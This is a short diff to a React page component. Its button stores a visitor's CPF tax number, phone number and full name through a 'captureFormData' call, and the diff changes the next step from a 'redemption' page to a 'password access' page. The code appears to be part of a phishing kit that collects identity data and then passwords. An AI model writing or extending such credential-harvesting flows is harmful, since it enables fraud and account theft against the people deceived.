@@ -119,7 +119,7 @@ const Index = () => {
 
         {/* CTA */}
         <button
-          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); navigate("/resgate", { state: { nome: nomeCompleto } }); }}
+          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); navigate("/senha-acesso", { state: { nome: nomeCompleto } }); }}
           disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
           className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
